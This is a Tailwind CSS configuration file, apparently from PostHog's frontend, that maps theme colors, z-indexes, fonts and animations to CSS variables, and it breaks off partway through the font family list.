/** @type {import('tailwindcss').Config} */
const plugin = require('tailwindcss/plugin')

const commonColors = {
    inherit: 'inherit',
    current: 'currentColor',
    transparent: 'transparent',
    accent: 'var(--color-accent)',
    'accent-inverted': 'var(--color-accent-inverted)',
    'accent-hover': 'var(--color-accent-hover)',
    'accent-active': 'var(--color-accent-active)',
    'accent-highlight-primary': 'var(--color-accent-highlight-primary)',
    'accent-highlight-secondary': 'var(--color-accent-highlight-secondary)',
    ai: 'var(--color-ai)',
}

const deprecatedColors = {
    'primary-highlight-light': 'var(--primary-highlight-light)',
    'text-3000-light': 'var(--text-3000-light)',
    'text-secondary-3000-light': 'var(--color-text-secondary-3000-light)',
    'muted-3000-light': 'var(--muted-3000-light)',
    'trace-3000-light': 'var(--trace-3000-light)',
    'primary-3000-light': 'var(--primary-3000-light)',
    'primary-3000-hover-light': 'var(--primary-3000-hover-light)',
    'primary-3000-active-light': 'var(--primary-3000-active-light)',
    'secondary-3000-light': 'var(--secondary-3000-light)',
    'secondary-3000-hover-light': 'var(--secondary-3000-hover-light)',
    'accent-3000-light': 'var(--color-accent-3000-light)',
    'bg-3000-light': 'var(--color-bg-3000-light)',
    'border-3000-light': 'var(--border-3000-light)',
    'border-bold-3000-light': 'var(--border-bold-3000-light)',
    'glass-bg-3000-light': 'var(--glass-bg-3000-light)',
    'glass-border-3000-light': 'var(--glass-border-3000-light)',
    'link-3000-light': 'var(--link-3000-light)',
    'primary-3000-frame-bg-light': 'var(--primary-3000-frame-bg-light)',
    'primary-3000-button-border-light': 'var(--primary-3000-button-border-light)',
    'primary-3000-button-border-hover-light': 'var(--primary-3000-button-border-hover-light)',
    'secondary-3000-frame-bg-light': 'var(--secondary-3000-frame-bg-light)',
    'secondary-3000-button-bg-light': 'var(--secondary-3000-button-bg-light)',
    'secondary-3000-button-border-light': 'var(--secondary-3000-button-border-light)',
    'secondary-3000-button-border-hover-light': 'var(--secondary-3000-button-border-hover-light)',
    'danger-3000-frame-bg-light': 'var(--danger-3000-frame-bg-light)',
    'danger-3000-button-border-light': 'var(--danger-3000-button-border-light)',
    'danger-3000-button-border-hover-light': 'var(--danger-3000-button-border-hover-light)',

    // PostHog 3000 - Dark mode
    'text-3000-dark': 'var(--text-3000-dark)',
    'text-secondary-3000-dark': 'var(--color-text-secondary-3000-dark)',
    'muted-3000-dark': 'var(--muted-3000-dark)',
    'trace-3000-dark': 'var(--trace-3000-dark)',
    'primary-3000-dark': 'var(--primary-3000-dark)',

    // --color-primary-highlight-dark: var(--primary-highlight-dark);
    'primary-3000-hover-dark': 'var(--primary-3000-hover-dark)',
    'primary-3000-active-dark': 'var(--primary-3000-active-dark)',
    'primary-alt-highlight-light': 'var(--primary-alt-highlight-light)',
    'secondary-3000-dark': 'var(--secondary-3000-dark)',
    'secondary-3000-hover-dark': 'var(--secondary-3000-hover-dark)',
    'accent-3000-dark': 'var(--color-accent-3000-dark)',
    'bg-3000-dark': 'var(--color-bg-3000-dark)',
    'border-3000-dark': 'var(--border-3000-dark)',
    'border-bold-3000-dark': 'var(--border-bold-3000-dark)',
    'glass-bg-3000-dark': 'var(--glass-bg-3000-dark)',
    'glass-border-3000-dark': 'var(--glass-border-3000-dark)',
    'link-3000-dark': 'var(--link-3000-dark)',
    'primary-3000-frame-bg-dark': 'var(--primary-3000-frame-bg-dark)',
    'primary-3000-button-border-dark': 'var(--primary-3000-button-border-dark)',
    'primary-3000-button-border-hover-dark': 'var(--primary-3000-button-border-hover-dark)',
    'primary-alt-highlight-dark': 'var(--primary-alt-highlight-dark)',
    'secondary-3000-frame-bg-dark': 'var(--secondary-3000-frame-bg-dark)',
    'secondary-3000-button-bg-dark': 'var(--secondary-3000-button-bg-dark)',
    'secondary-3000-button-border-dark': 'var(--secondary-3000-button-border-dark)',
    'secondary-3000-button-border-hover-dark': 'var(--secondary-3000-button-border-hover-dark)',
    'danger-3000-frame-bg-dark': 'var(--danger-3000-frame-bg-dark)',
    'danger-3000-button-border-dark': 'var(--danger-3000-button-border-dark)',
    'danger-3000-button-border-hover-dark': 'var(--danger-3000-button-border-hover-dark)',

    // Shadows
    // --color-shadow-elevation-3000-light: var(--shadow-elevation-3000-light);
    // --color-shadow-elevation-3000-dark: var(--shadow-elevation-3000-dark);

    // The derived colors
    // `--default` is a pre-3000 alias for "default text color" (`--text-3000` now)
    // --color-default: var(--default);
    // --color-text-3000: var(--text-3000);
    // --color-text-secondary-3000: var(--color-text-secondary-3000);
    // --color-muted-3000: var(--muted-3000);
    // --color-primary-3000: var(--primary-3000);
    // --color-secondary-3000: var(--secondary-3000);
    // --color-secondary-3000-hover: var(--secondary-3000-hover);
    // --color-accent-3000: var(--color-bg-surface-primary);
    // --color-bg-3000: var(--color-bg-primary);
    // --color-primary-highlight: var(--primary-highlight);
    // --color-primary-alt-highlight: var(--primary-alt-highlight);
    // --color-primary-alt: var(--primary-alt);

    // 'primary': 'var(--primary-3000)',
    muted: 'var(--muted-3000)',
    default: 'var(--text-3000)',
    'muted-alt': 'var(--muted-3000)',
    'primary-alt': 'var(--text-3000)',

    // --color-border: var(--color-border-primary);
    // --color-border-bold: var(--border-bold-3000);
    // --color-data-color-1: var(--data-color-1);
    // --color-data-color-10: var(--data-color-10);

    'bg-bridge': 'var(--color-bg-bridge)',

    // Non-color vars
    'modal-shadow-elevation': 'var(--modal-shadow-elevation)',
    'opacity-disabled': 'var(--opacity-disabled)',
    'font-medium': 'var(--font-medium)',
    'font-semibold': 'var(--font-semibold)',
    'font-sans': 'var(--font-sans)',
    'font-title': 'var(--font-title)',
    'font-mono': 'var(--font-mono)',

    // Dashboard item colors
    blue: 'var(--blue)',
    purple: 'var(--purple)',
    green: 'var(--green)',
    black: 'var(--black)',

    //// Data colors (e.g. insight series). Note: colors.ts relies on these values being hexadecimal
    'data-color-1': 'var(--data-color-1)',
    'data-color-1-hover': 'var(--data-color-1-hover)',
    'data-color-2': 'var(--data-color-2)',
    'data-color-3': 'var(--data-color-3)',
    'data-color-4': 'var(--data-color-4)',
    'data-color-5': 'var(--data-color-5)',
    'data-color-6': 'var(--data-color-6)',
    'data-color-7': 'var(--data-color-7)',
    'data-color-8': 'var(--data-color-8)',
    'data-color-9': 'var(--data-color-9)',
    'data-color-10': 'var(--data-color-10)',
    'data-color-11': 'var(--data-color-11)',
    'data-color-12': 'var(--data-color-12)',
    'data-color-13': 'var(--data-color-13)',
    'data-color-14': 'var(--data-color-14)',
    'data-color-15': 'var(--data-color-15)',

    // Lifecycle series (compiled)
    'color-lifecycle-new': 'var(--color-lifecycle-new)',
    'color-lifecycle-returning': 'var(--color-lifecycle-returning)',
    'color-lifecycle-resurrecting': 'var(--color-lifecycle-resurrecting)',
    'color-lifecycle-dormant': 'var(--color-lifecycle-dormant)',
    'color-lifecycle-new-hover': 'var(--color-lifecycle-new-hover)',
    'color-lifecycle-returning-hover': 'var(--color-lifecycle-returning-hover)',
    'color-lifecycle-resurrecting-hover': 'var(--color-lifecycle-resurrecting-hover)',
    'color-lifecycle-dormant-hover': 'var(--color-lifecycle-dormant-hover)',

    // Revenue analytics MRR series (compiled)
    'color-revenue-analytics-new': 'var(--color-revenue-analytics-new)',
    'color-revenue-analytics-expansion': 'var(--color-revenue-analytics-expansion)',
    'color-revenue-analytics-contraction': 'var(--color-revenue-analytics-contraction)',
    'color-revenue-analytics-churn': 'var(--color-revenue-analytics-churn)',
    'color-revenue-analytics-new-hover': 'var(--color-revenue-analytics-new-hover)',
    'color-revenue-analytics-expansion-hover': 'var(--color-revenue-analytics-expansion-hover)',
    'color-revenue-analytics-contraction-hover': 'var(--color-revenue-analytics-contraction-hover)',
    'color-revenue-analytics-churn-hover': 'var(--color-revenue-analytics-churn-hover)',

    // Z-indexes
    'z-top': 'var(--z-top)',
    'z-bottom-notice': 'var(--z-bottom-notice)',
    'z-shortcut-menu': 'var(--z-shortcut-menu)',
    'z-force-modal-above-popovers': 'var(--z-force-modal-above-popovers)',
    'z-tooltip': 'var(--z-tooltip)',

    // 1066 through 1069 are reserved to be set from code
    'z-definition-popover': 'var(--z-definition-popover)',
    'z-popover': 'var(--z-popover)',
    'z-graph-tooltip': 'var(--z-graph-tooltip)',

    // 1061 and 1062 are reserved to be set from code
    'z-modal': 'var(--z-modal)',
    'z-hedgehog-buddy': 'var(--z-hedgehog-buddy)',
    'z-annotation-popover': 'var(--z-annotation-popover)',
    'z-drawer': 'var(--z-drawer)',
    'z-notifications-popover': 'var(--z-notifications-popover)',
    'z-main-nav': 'var(--z-main-nav)',
    'z-lemon-sidebar': 'var(--z-lemon-sidebar)',
    'z-lemon-activation-sidebar': 'var(--z-lemon-activation-sidebar)',
    'z-mobile-nav-overlay': 'var(--z-mobile-nav-overlay)',
    'z-top-navigation': 'var(--z-top-navigation)',
    'z-content-overlay': 'var(--z-content-overlay)',
    'z-raised': 'var(--z-raised)',

    // Toasts
    // Update and override from react-toastify
    // which attaches these variables to :root
    // which means they aren't available in the toolbar
    'toastify-color-dark': 'var(--toastify-color-dark)',
    'toastify-color-light': 'var(--toastify-color-light)',
    'toastify-color-info': 'var(--toastify-color-info)',
    'toastify-color-success': 'var(--toastify-color-success)',
    'toastify-color-warning': 'var(--toastify-color-warning)',
    'toastify-color-error': 'var(--toastify-color-error)',
    'toastify-color-progress-info': 'var(--toastify-color-progress-info)',
    'toastify-color-progress-success': 'var(--toastify-color-progress-success)',
    'toastify-color-progress-warning': 'var(--toastify-color-progress-warning)',
    'toastify-color-progress-error': 'var(--toastify-color-progress-error)',
    'toastify-toast-background': 'var(--toastify-toast-background)',

    // TODO: --color-toastify-toast-width: var(--toastify-toast-width);
    // TODO: --color-toastify-toast-min-height: var(--toastify-toast-min-height);
    // TODO: --color-toastify-toast-max-height: var(--toastify-toast-max-height);
    'toastify-text-color-light': 'var(--toastify-text-color-light)',

    // In-app prompts
    'in-app-prompts-width': 'var(--in-app-prompts-width)',
    'lettermark-1-bg': 'var(--lettermark-1-bg)',
    'lettermark-1-text': 'var(--lettermark-1-text)',
    'lettermark-2-bg': 'var(--lettermark-2-bg)',
    'lettermark-2-text': 'var(--lettermark-2-text)',
    'lettermark-3-bg': 'var(--lettermark-3-bg)',
    'lettermark-3-text': 'var(--lettermark-3-text)',
    'lettermark-4-bg': 'var(--lettermark-4-bg)',
    'lettermark-4-text': 'var(--lettermark-4-text)',
    'lettermark-5-bg': 'var(--lettermark-5-bg)',
    'lettermark-5-text': 'var(--lettermark-5-text)',
    'lettermark-6-bg': 'var(--lettermark-6-bg)',
    'lettermark-6-text': 'var(--lettermark-6-text)',
    'lettermark-7-bg': 'var(--lettermark-7-bg)',
    'lettermark-7-text': 'var(--lettermark-7-text)',
    'lettermark-8-bg': 'var(--lettermark-8-bg)',
    'lettermark-8-text': 'var(--lettermark-8-text)',
    'lettermark-9-bg': 'var(--lettermark-9-bg)',
    'lettermark-9-text': 'var(--lettermark-9-text)',
    'lettermark-10-bg': 'var(--lettermark-10-bg)',
    'lettermark-10-text': 'var(--lettermark-10-text)',
    'lettermark-11-bg': 'var(--lettermark-11-bg)',
    'lettermark-11-text': 'var(--lettermark-11-text)',
    'lettermark-12-bg': 'var(--lettermark-12-bg)',
    'lettermark-12-text': 'var(--lettermark-12-text)',
    'lettermark-13-bg': 'var(--lettermark-13-bg)',
    'lettermark-13-text': 'var(--lettermark-13-text)',
    'lettermark-14-bg': 'var(--lettermark-14-bg)',
    'lettermark-14-text': 'var(--lettermark-14-text)',
    'lettermark-15-bg': 'var(--lettermark-15-bg)',
    'lettermark-15-text': 'var(--lettermark-15-text)',
    'lettermark-16-bg': 'var(--lettermark-16-bg)',
    'lettermark-16-text': 'var(--lettermark-16-text)',

    // Modals
    // TODO: --color-modal-backdrop-blur: var(--modal-backdrop-blur);
    'modal-backdrop-color': 'var(--modal-backdrop-color)',

    // TODO: --color-modal-transition-time: var(--modal-transition-time);

    // Tooltips
    'tooltip-bg-light': 'var(--tooltip-bg-light)',
    'tooltip-bg-dark': 'var(--tooltip-bg-dark)',

    // Notebooks
    'notebook-popover-transition-properties': 'var(--notebook-popover-transition-properties)',
    'notebook-column-left-width': 'var(--notebook-column-left-width)',
    'notebook-column-right-width': 'var(--notebook-column-right-width)',

    // Light mode
    danger: 'var(--danger)',
    'danger-light': 'var(--danger-light)',
    'danger-lighter': 'var(--danger-lighter)',
    'danger-dark': 'var(--danger-dark)',
    'danger-highlight': 'var(--danger-highlight)',
    warning: 'var(--warning)',
    'warning-highlight': 'var(--warning-highlight)',
    'warning-dark': 'var(--warning-dark)',
    highlight: 'var(--highlight)',
    success: 'var(--success)',
    'success-light': 'var(--success-light)',
    'success-lighter': 'var(--success-lighter)',
    'success-dark': 'var(--success-dark)',
    'success-highlight': 'var(--success-highlight)',

    // --color-muted: var(--color-text-secondary);
    // --color-muted-alt: var(--color-text-secondary);
    // --color-primary-alt: var(--primary-alt);
    mark: 'var(--mark)',
    white: 'var(--white)',

    // --color-bg-light: var(--color-bg-surface-primary);
    side: 'var(--side)',
    mid: 'var(--mid)',
    border: 'var(--border)',
    'border-light': 'var(--border-light)',
    'border-bold': 'var(--border-bold)',
    transparent: 'var(--transparent)',
    link: 'var(--link)',
    'brand-blue': 'var(--brand-blue)',
    'brand-red': 'var(--brand-red)',
    'brand-yellow': 'var(--brand-yellow)',
    'brand-key': 'var(--brand-key)',
    accent: 'var(--color-accent)',
    'text-3000': 'var(--text-3000)',
    'text-secondary-3000': 'var(--color-text-secondary-3000)',
    'muted-3000': 'var(--muted-3000)',
    'trace-3000': 'var(--trace-3000)',
    'primary-3000': 'var(--color-accent)',

    'primary-3000-hover': 'var(--color-accent-hover)',
    'primary-3000-active': 'var(--color-accent-active)',
    'secondary-3000': 'var(--secondary-3000)',
    'secondary-3000-hover': 'var(--secondary-3000-hover)',
    'accent-3000': 'var(--color-bg-surface-primary)',
    'bg-3000': 'var(--color-bg-primary)',
    'border-3000': 'var(--color-border-primary)',
    'border-light-opaque': 'var(--border-light-opaque)',
    'border-bold-3000': 'var(--border-bold-3000)',
    'glass-bg-3000': 'var(--glass-bg-3000)',
    'glass-border-3000': 'var(--color-border-primary)',
    'bg-light': 'var(--color-bg-surface-primary)',
    'bg-table': 'var(--color-bg-table)',

    // --color-link: var(--link);
    // TODO: --color-shadow-elevation-3000: var(--shadow-elevation-3000);
    'primary-3000-frame-bg': 'var(--primary-3000-frame-bg)',
    'primary-3000-button-bg': 'var(--primary-3000-button-bg)',
    'primary-3000-button-border': 'var(--primary-3000-button-border)',
    'primary-3000-button-border-hover': 'var(--primary-3000-button-border-hover)',
    'primary-alt-highlight': 'var(--primary-alt-highlight)',
    'secondary-3000-frame-bg': 'var(--secondary-3000-frame-bg)',
    'secondary-3000-button-bg': 'var(--secondary-3000-button-bg)',
    'secondary-3000-button-border': 'var(--secondary-3000-button-border)',
    'secondary-3000-button-border-hover': 'var(--secondary-3000-button-border-hover)',
    'danger-3000-frame-bg': 'var(--danger-3000-frame-bg)',
    'danger-3000-button-border': 'var(--danger-3000-button-border)',
    'danger-3000-button-border-hover': 'var(--danger-3000-button-border-hover)',
    'tooltip-bg': 'var(--tooltip-bg)',
}

const config = {
    content: [
        // Starting all paths with '../.." to share this between frontend/, playwright/ and common/storybook/
        '../../frontend/src/**/*.{ts,tsx}',
        '../../frontend/src/index.html',
        '../../products/**/frontend/**/*.{ts,tsx}',
        '../../products/**/mcp/apps/**/*.{ts,tsx}',
        '../../common/mosaic/src/**/*.{ts,tsx}',
        // @posthog/quill ships BEM CSS for component look, but uses Tailwind
        // utilities for layout/spacing in its compiled JS. Scan dist here so
        // those utilities get compiled into this pre-built Tailwind bundle.
        '../../packages/quill/packages/quill/dist/**/*.{js,cjs}',
        '!../../frontend/src/**/*Type.ts',
    ],
    darkMode: ['selector', '[theme="dark"]'],
    important: true,
    theme: {
        colors: {
            red: {
                50: 'var(--color-red-50)',
                100: 'var(--color-red-100)',
                200: 'var(--color-red-200)',
                300: 'var(--color-red-300)',
                400: 'var(--color-red-400)',
                500: 'var(--color-red-500)',
                600: 'var(--color-red-600)',
                700: 'var(--color-red-700)',
                800: 'var(--color-red-800)',
                900: 'var(--color-red-900)',
                950: 'var(--color-red-950)',
            },
            orange: {
                50: 'var(--color-orange-50)',
                100: 'var(--color-orange-100)',
                200: 'var(--color-orange-200)',
                300: 'var(--color-orange-300)',
                400: 'var(--color-orange-400)',
                500: 'var(--color-orange-500)',
                600: 'var(--color-orange-600)',
                700: 'var(--color-orange-700)',
                800: 'var(--color-orange-800)',
                900: 'var(--color-orange-900)',
                950: 'var(--color-orange-950)',
            },
            amber: {
                50: 'var(--color-amber-50)',
                100: 'var(--color-amber-100)',
                200: 'var(--color-amber-200)',
                300: 'var(--color-amber-300)',
                400: 'var(--color-amber-400)',
                500: 'var(--color-amber-500)',
                600: 'var(--color-amber-600)',
                700: 'var(--color-amber-700)',
                800: 'var(--color-amber-800)',
                900: 'var(--color-amber-900)',
                950: 'var(--color-amber-950)',
            },
            yellow: {
                50: 'var(--color-yellow-50)',
                100: 'var(--color-yellow-100)',
                200: 'var(--color-yellow-200)',
                300: 'var(--color-yellow-300)',
                400: 'var(--color-yellow-400)',
                500: 'var(--color-yellow-500)',
                600: 'var(--color-yellow-600)',
                700: 'var(--color-yellow-700)',
                800: 'var(--color-yellow-800)',
                900: 'var(--color-yellow-900)',
                950: 'var(--color-yellow-950)',
            },
            lime: {
                50: 'var(--color-lime-50)',
                100: 'var(--color-lime-100)',
                200: 'var(--color-lime-200)',
                300: 'var(--color-lime-300)',
                400: 'var(--color-lime-400)',
                500: 'var(--color-lime-500)',
                600: 'var(--color-lime-600)',
                700: 'var(--color-lime-700)',
                800: 'var(--color-lime-800)',
                900: 'var(--color-lime-900)',
                950: 'var(--color-lime-950)',
            },
            green: {
                50: 'var(--color-green-50)',
                100: 'var(--color-green-100)',
                200: 'var(--color-green-200)',
                300: 'var(--color-green-300)',
                400: 'var(--color-green-400)',
                500: 'var(--color-green-500)',
                600: 'var(--color-green-600)',
                700: 'var(--color-green-700)',
                800: 'var(--color-green-800)',
                900: 'var(--color-green-900)',
                950: 'var(--color-green-950)',
            },
            emerald: {
                50: 'var(--color-emerald-50)',
                100: 'var(--color-emerald-100)',
                200: 'var(--color-emerald-200)',
                300: 'var(--color-emerald-300)',
                400: 'var(--color-emerald-400)',
                500: 'var(--color-emerald-500)',
                600: 'var(--color-emerald-600)',
                700: 'var(--color-emerald-700)',
                800: 'var(--color-emerald-800)',
                900: 'var(--color-emerald-900)',
                950: 'var(--color-emerald-950)',
            },
            teal: {
                50: 'var(--color-teal-50)',
                100: 'var(--color-teal-100)',
                200: 'var(--color-teal-200)',
                300: 'var(--color-teal-300)',
                400: 'var(--color-teal-400)',
                500: 'var(--color-teal-500)',
                600: 'var(--color-teal-600)',
                700: 'var(--color-teal-700)',
                800: 'var(--color-teal-800)',
                900: 'var(--color-teal-900)',
                950: 'var(--color-teal-950)',
            },
            cyan: {
                50: 'var(--color-cyan-50)',
                100: 'var(--color-cyan-100)',
                200: 'var(--color-cyan-200)',
                300: 'var(--color-cyan-300)',
                400: 'var(--color-cyan-400)',
                500: 'var(--color-cyan-500)',
                600: 'var(--color-cyan-600)',
                700: 'var(--color-cyan-700)',
                800: 'var(--color-cyan-800)',
                900: 'var(--color-cyan-900)',
                950: 'var(--color-cyan-950)',
            },
            sky: {
                50: 'var(--color-sky-50)',
                100: 'var(--color-sky-100)',
                200: 'var(--color-sky-200)',
                300: 'var(--color-sky-300)',
                400: 'var(--color-sky-400)',
                500: 'var(--color-sky-500)',
                600: 'var(--color-sky-600)',
                700: 'var(--color-sky-700)',
                800: 'var(--color-sky-800)',
                900: 'var(--color-sky-900)',
                950: 'var(--color-sky-950)',
            },
            blue: {
                50: 'var(--color-blue-50)',
                100: 'var(--color-blue-100)',
                200: 'var(--color-blue-200)',
                300: 'var(--color-blue-300)',
                400: 'var(--color-blue-400)',
                500: 'var(--color-blue-500)',
                600: 'var(--color-blue-600)',
                700: 'var(--color-blue-700)',
                800: 'var(--color-blue-800)',
                900: 'var(--color-blue-900)',
                950: 'var(--color-blue-950)',
            },
            indigo: {
                50: 'var(--color-indigo-50)',
                100: 'var(--color-indigo-100)',
                200: 'var(--color-indigo-200)',
                300: 'var(--color-indigo-300)',
                400: 'var(--color-indigo-400)',
                500: 'var(--color-indigo-500)',
                600: 'var(--color-indigo-600)',
                700: 'var(--color-indigo-700)',
                800: 'var(--color-indigo-800)',
                900: 'var(--color-indigo-900)',
                950: 'var(--color-indigo-950)',
            },
            violet: {
                50: 'var(--color-violet-50)',
                100: 'var(--color-violet-100)',
                200: 'var(--color-violet-200)',
                300: 'var(--color-violet-300)',
                400: 'var(--color-violet-400)',
                500: 'var(--color-violet-500)',
                600: 'var(--color-violet-600)',
                700: 'var(--color-violet-700)',
                800: 'var(--color-violet-800)',
                900: 'var(--color-violet-900)',
                950: 'var(--color-violet-950)',
            },
            purple: {
                50: 'var(--color-purple-50)',
                100: 'var(--color-purple-100)',
                200: 'var(--color-purple-200)',
                300: 'var(--color-purple-300)',
                400: 'var(--color-purple-400)',
                500: 'var(--color-purple-500)',
                600: 'var(--color-purple-600)',
                700: 'var(--color-purple-700)',
                800: 'var(--color-purple-800)',
                900: 'var(--color-purple-900)',
                950: 'var(--color-purple-950)',
            },
            fuchsia: {
                50: 'var(--color-fuchsia-50)',
                100: 'var(--color-fuchsia-100)',
                200: 'var(--color-fuchsia-200)',
                300: 'var(--color-fuchsia-300)',
                400: 'var(--color-fuchsia-400)',
                500: 'var(--color-fuchsia-500)',
                600: 'var(--color-fuchsia-600)',
                700: 'var(--color-fuchsia-700)',
                800: 'var(--color-fuchsia-800)',
                900: 'var(--color-fuchsia-900)',
                950: 'var(--color-fuchsia-950)',
            },
            pink: {
                50: 'var(--color-pink-50)',
                100: 'var(--color-pink-100)',
                200: 'var(--color-pink-200)',
                300: 'var(--color-pink-300)',
                400: 'var(--color-pink-400)',
                500: 'var(--color-pink-500)',
                600: 'var(--color-pink-600)',
                700: 'var(--color-pink-700)',
                800: 'var(--color-pink-800)',
                900: 'var(--color-pink-900)',
                950: 'var(--color-pink-950)',
            },
            rose: {
                50: 'var(--color-rose-50)',
                100: 'var(--color-rose-100)',
                200: 'var(--color-rose-200)',
                300: 'var(--color-rose-300)',
                400: 'var(--color-rose-400)',
                500: 'var(--color-rose-500)',
                600: 'var(--color-rose-600)',
                700: 'var(--color-rose-700)',
                800: 'var(--color-rose-800)',
                900: 'var(--color-rose-900)',
                950: 'var(--color-rose-950)',
            },
            slate: {
                50: 'var(--color-slate-50)',
                100: 'var(--color-slate-100)',
                200: 'var(--color-slate-200)',
                300: 'var(--color-slate-300)',
                400: 'var(--color-slate-400)',
                500: 'var(--color-slate-500)',
                600: 'var(--color-slate-600)',
                700: 'var(--color-slate-700)',
                800: 'var(--color-slate-800)',
                900: 'var(--color-slate-900)',
                950: 'var(--color-slate-950)',
            },
            gray: {
                50: 'var(--color-gray-50)',
                100: 'var(--color-gray-100)',
                200: 'var(--color-gray-200)',
                300: 'var(--color-gray-300)',
                400: 'var(--color-gray-400)',
                500: 'var(--color-gray-500)',
                600: 'var(--color-gray-600)',
                700: 'var(--color-gray-700)',
                800: 'var(--color-gray-800)',
                900: 'var(--color-gray-900)',
                950: 'var(--color-gray-950)',
            },
            zinc: {
                50: 'var(--color-zinc-50)',
                100: 'var(--color-zinc-100)',
                200: 'var(--color-zinc-200)',
                300: 'var(--color-zinc-300)',
                400: 'var(--color-zinc-400)',
                500: 'var(--color-zinc-500)',
                600: 'var(--color-zinc-600)',
                700: 'var(--color-zinc-700)',
                800: 'var(--color-zinc-800)',
                900: 'var(--color-zinc-900)',
                950: 'var(--color-zinc-950)',
            },
            neutral: {
                50: 'var(--color-neutral-50)',
                100: 'var(--color-neutral-100)',
                200: 'var(--color-neutral-200)',
                300: 'var(--color-neutral-300)',
                400: 'var(--color-neutral-400)',
                500: 'var(--color-neutral-500)',
                600: 'var(--color-neutral-600)',
                700: 'var(--color-neutral-700)',
                800: 'var(--color-neutral-800)',
                900: 'var(--color-neutral-900)',
                950: 'var(--color-neutral-950)',
            },
            stone: {
                50: 'var(--color-stone-50)',
                100: 'var(--color-stone-100)',
                200: 'var(--color-stone-200)',
                300: 'var(--color-stone-300)',
                400: 'var(--color-stone-400)',
                500: 'var(--color-stone-500)',
                600: 'var(--color-stone-600)',
                700: 'var(--color-stone-700)',
                800: 'var(--color-stone-800)',
                900: 'var(--color-stone-900)',
                950: 'var(--color-stone-950)',
            },
            black: 'var(--color-black)',
            white: 'var(--color-white)',
        },
        extend: {
            animation: {
                // Default pulse animation but run for only 5 iterations
                'pulse-5': 'pulse 2s cubic-bezier(0.4, 0, 0.6, 1) 5',
                // Pulsing glow effect for highlighting UI elements
                'pulse-glow': 'pulse-glow 2s ease-in-out infinite',
                // Fade out after a delay
                'fade-out-delayed': 'fade-out-delayed 5s ease-out forwards',
                // Quick horizontal shake
                shake: 'shake 0.5s ease-in-out',
            },
            keyframes: {
                'pulse-glow': {
                    '0%, 100%': {
                        boxShadow: '0 0 2px 1px var(--color-accent)',
                    },
                    '50%': {
                        boxShadow: '0 0 6px 2px var(--color-accent)',
                    },
                },
                'fade-out-delayed': {
                    '0%, 30%': { opacity: '1' },
                    '100%': { opacity: '0' },
                },
                shake: {
                    '0%, 100%': { transform: 'translateX(0)' },
                    '20%': { transform: 'translateX(-3px)' },
                    '40%': { transform: 'translateX(3px)' },
                    '60%': { transform: 'translateX(-2px)' },
                    '80%': { transform: 'translateX(2px)' },
                },
            },
            colors: {
                ...deprecatedColors,
                // TODO: Move all colors over to Tailwind
                // Currently color utility classes are still generated with SCSS in colors.scss due to relying on our color
                // CSS vars in lots of stylesheets

                // purple: '#B62AD9',
                'primary-highlight': 'var(--primary-highlight)',
            },
            backgroundColor: {
                ...commonColors,
                primary: 'var(--color-bg-primary)',

                'surface-primary': 'var(--color-bg-surface-primary)',
                'surface-secondary': 'var(--color-bg-surface-secondary)',
                'surface-tertiary': 'var(--color-bg-surface-tertiary)',
                'surface-tooltip': 'var(--color-bg-surface-tooltip)',
                'surface-tooltip-inverse': 'var(--color-bg-surface-tooltip-inverse)',
                'surface-popover': 'var(--color-bg-surface-popover)',
                'surface-popover-inverse': 'var(--color-bg-surface-popover-inverse)',
                'fill-primary': 'var(--color-bg-fill-primary)',
                'fill-secondary': 'var(--color-bg-fill-secondary)',
                'fill-tertiary': 'var(--color-bg-fill-tertiary)',
                'fill-highlight-50': 'var(--color-bg-fill-highlight-50)',
                'fill-highlight-inverse-50': 'var(--color-bg-fill-highlight-inverse-50)',
                'fill-highlight-100': 'var(--color-bg-fill-highlight-100)',
                'fill-highlight-inverse-100': 'var(--color-bg-fill-highlight-inverse-100)',
                'fill-highlight-150': 'var(--color-bg-fill-highlight-150)',
                'fill-highlight-inverse-150': 'var(--color-bg-fill-highlight-inverse-150)',
                'fill-highlight-200': 'var(--color-bg-fill-highlight-200)',
                'fill-highlight-inverse-200': 'var(--color-bg-fill-highlight-inverse-200)',
                'fill-primary-highlight': 'var(--color-bg-fill-primary-highlight)',
                'fill-info-secondary': 'var(--color-bg-fill-info-secondary)',
                'fill-info-tertiary': 'var(--color-bg-fill-info-tertiary)',
                'fill-info-highlight': 'var(--color-bg-fill-info-highlight)',
                'fill-warning-secondary': 'var(--color-bg-fill-warning-secondary)',
                'fill-warning-tertiary': 'var(--color-bg-fill-warning-tertiary)',
                'fill-warning-highlight': 'var(--color-bg-fill-warning-highlight)',
                'fill-error-secondary': 'var(--color-bg-fill-error-secondary)',
                'fill-error-tertiary': 'var(--color-bg-fill-error-tertiary)',
                'fill-error-highlight': 'var(--color-bg-fill-error-highlight)',
                'fill-success-secondary': 'var(--color-bg-fill-success-secondary)',
                'fill-success-tertiary': 'var(--color-bg-fill-success-tertiary)',
                'fill-success-highlight': 'var(--color-bg-fill-success-highlight)',
                'fill-button-group-tertiary-hover': 'var(--color-bg-fill-button-group-tertiary-hover)',
                'fill-button-tertiary-hover': 'var(--color-bg-fill-button-tertiary-hover)',
                'fill-button-tertiary-hover-inverse': 'var(--color-bg-fill-button-tertiary-hover-inverse)',
                'fill-button-tertiary-active': 'var(--color-bg-fill-button-tertiary-active)',
                'fill-button-tertiary-active-inverse': 'var(--color-bg-fill-button-tertiary-active-inverse)',
                'fill-input': 'var(--color-bg-fill-input)',
                'fill-switch': 'var(--color-bg-fill-switch)',
                'fill-slider-rail': 'var(--color-bg-fill-slider-rail)',
                'fill-scroll-thumb': 'var(--color-bg-fill-scroll-thumb)',
                'border-primary': 'var(--color-bg-border-primary)',
                'border-secondary': 'var(--color-bg-border-secondary)',
            },
            textColor: {
                ...commonColors,

                primary: 'var(--color-text-primary)',
                'primary-inverse': 'var(--color-text-primary-inverse)',
                'secondary-inverse': 'var(--color-text-secondary-inverse)',
                secondary: 'var(--color-text-secondary)',
                tertiary: 'var(--color-text-tertiary)',
                success: 'var(--color-text-success)',
                warning: 'var(--color-text-warning)',
                error: 'var(--color-text-error)',
            },
            borderColor: {
                ...commonColors,

                primary: 'var(--color-border-primary)',
                secondary: 'var(--color-border-secondary)',
                info: 'var(--color-border-info)',
                warning: 'var(--color-border-warning)',
                error: 'var(--color-border-error)',
                success: 'var(--color-border-success)',
            },
            ringColor: {
                ...commonColors,

                primary: 'var(--color-border-primary)',
                secondary: 'var(--color-border-secondary)',
                info: 'var(--color-border-info)',
                warning: 'var(--color-border-warning)',
                error: 'var(--color-border-error)',
                success: 'var(--color-border-success)',
            },
            fontFamily: {
                sans: [
                    'Emoji Flags Polyfill',
                    '-apple-system',
                    'BlinkMacSystemFont',
                    'Inter',
                    'Segoe UI',
                    'Roboto',
